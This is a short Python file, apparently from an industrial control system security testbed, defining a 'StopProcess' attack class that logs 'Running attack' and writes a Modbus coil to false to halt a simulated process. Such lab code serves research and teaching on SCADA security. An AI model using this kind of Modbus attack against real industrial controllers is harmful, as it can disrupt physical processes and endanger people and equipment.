import argparse
import os
import sys
import time
import random
from datetime import datetime

from pymodbus.client.sync import ModbusTcpClient
from pyics.utils import *

from tankOverflow import MTUAttack

sys.path.insert(0, "../examples/medium-process")
from constants import *

class StopProcess(MTUAttack):

    def main_loop(self):
        self.export_file("[{}] Running attack\n".format(datetime.now()))
        self.change_coil(WM, False)
